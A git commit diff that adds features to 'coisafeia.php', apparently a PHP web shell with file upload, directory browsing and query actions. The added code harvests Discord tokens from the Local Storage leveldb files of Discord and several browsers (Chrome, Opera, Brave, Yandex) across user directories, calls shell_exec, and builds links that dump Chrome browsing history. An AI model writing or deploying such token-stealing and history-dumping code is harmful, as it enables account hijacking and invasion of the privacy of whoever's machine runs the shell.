260c6f65edee3f3a525664fafc263f2f672e9d05
padero <68622956+shidemuri@users.noreply.github.com>
2024-07-04 09:52:40 -0300

    Update coisafeia.php
    ações rápidas (abrir historico do chrome e ver tokens de coisas)

--- coisafeia.php
+++ coisafeia.php
@@ -95,7 +95,7 @@
     };
     
     echo '<h3>' . $rawdir . '</h3>';
-    echo '<style> *{font-size:18px} </style>';
+    echo '<style> *{font-size:18px} table,tr,td,th{border:1px solid black;border-collapse:collapse;}</style>';
     if(is_dir($rawdir)) {?>
         <form action="" method="post" enctype="multipart/form-data">
             <input type="hidden" name="action" value="upload">
@@ -103,16 +103,93 @@
             <input type="file" name="arquivo">
             <input type="submit">
         </form>
-            <?php
+        <p></p>
+        <label for="qa">asdpkfgnhlxfgh</label>
+        <select name="qa" id="qa">
+            <option value="chrome" selected>chrome</option>
+            <option value="discord">discord</option>
+        </select>
+        <script>
+            document.body.onload = ()=>{
+                const socoror = e=>{
+                    const selection = e
+                    switch(selection){
+                        case "chrome":
+                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
+                                DESGRAÇA.href = DESGRAÇA.querySelector('input[name="chrome"]').value;
+                            }
+                        break;
+                        case "discord":
+                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
+                                DESGRAÇA.href = `javascript: console.log(${DESGRAÇA.querySelector('input[name="tokens"]').value})`;
+                            }
+                        break;
+                    };
+                }
+                console.log(1);
+                document.querySelector('#qa').addEventListener('change',e=>{socoror(event.target.value.substring(e.target.selectionStart,e.target.selectionEnd))})
+                socoror('chrome')
+            }
+        </script>
+            <table>
+                <tr>
+                    <th>
+                        :3
+                    </th>
+                    <th>
+                        asdpkfgnhlxfgh
+                    </th>
+                </tr>
+            <?php 
                 for($i = 0; $i < count($dir); $i++) {?>
-                    <p><a href="?path=<?=$rawdir . '\\' . $dir[$i]?>">
+                    <tr>
+                    <td><p><a href="?path=<?=$rawdir . '\\' . $dir[$i]?>">
                     <?php
                     if(is_dir($rawdir . '\\' . $dir[$i])) {
                         echo "\u{1f4c2}";
                     };
-            ?><?=$dir[$i]?></a></p>
-    <?php
-        };
+                ?><?=$dir[$i]?></a></p></td>
+                    <td> <a class="q">welcome to my woorld *gets chalked* <form><input type="hidden" name="tokens" value='<?php 
+                                    $euqueromematar = '';
+                                    $reg="/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/";
+                                    $folders=['appdata\\Discord',"appdata\\discordcanary","appdata\\discordptb","localappdata\\Google\\Chrome\\User Data\\Default","appdata\\Opera Software\\Opera Stable","appdata\\Opera Software\\Opera GX Stable","localappdata\\BraveSoftware\\Brave-Browser\\User Data\\Default","localappdata\\Yandex\\YandexBrowser\\User Data\\Default"];
+                                    $userdir=$rawdir;
+                                    $localappdata=$userdir.'\\AppData\\Local';
+                                    $appdata=$userdir.'\\AppData\\Roaming';
+                                    foreach($folders as $browser){
+                                        $browser=preg_replace("/localappdata/",$localappdata,$browser);
+                                        $browser=preg_replace("/appdata/",$appdata,$browser);
+                                        $leveldb=$browser.'\\Local Storage\\leveldb';
+                                        if(is_dir($leveldb)){
+                                            $guh=scandir($leveldb);
+                                            $cuh=array_filter($guh,function($v,$k){
+                                                return substr($v,-4)==".ldb";
+                                            },ARRAY_FILTER_USE_BOTH);
+                                            foreach($cuh as $ii=>$dbfile){
+                                                $data=file_get_contents($leveldb.'\\'.$dbfile);
+                                                if(preg_match_all($reg,$data)>0){
+                                                    $euqueromematar = $euqueromematar . '"file":"'.$leveldb.'\\'.$dbfile.'","';
+                                                    preg_match("/(\d{2}\/){2}\d{4}\s\d{2}:\d{2}/", shell_exec('for %A in ("'.$leveldb.'\\'.$dbfile.'") do echo %~tA'),$guhh);
+                                                    $euqueromematar = $euqueromematar . '"modify":'.$guhh[0].'",';
+                                                    $aaaaa=[];
+                                                    preg_match($reg,$data,$aaaaa);
+                                                    $euqueromematar = $euqueromematar . '"tokens":[';
+                                                    foreach($aaaaa as $iii=>$token){
+                                                        $euqueromematar = $euqueromematar . '"'.$token.'",';
+                                                    };
+                                                    $euqueromematar = $euqueromematar . "]}";
+                                                    };
+                                                };
+                                            };
+                                        }; 
+                                        echo $euqueromematar;
+                                    ?>'> <input type="hidden" name="chrome" value='?path=<?=$rawdir . '\\' . $dir[$i]?>\\AppData\\Local\\Google\\Chrome\\User%20Data\\Default\\History&action=sqlite&query=.dump'> </form></a> </td>
+                </tr>
+                <?php
+                };
+            ?>
+            </table>
+              <?php  
     } elseif(isset($_REQUEST['action'])){ 
         switch($_REQUEST['action']){
             case 'edit': ?>
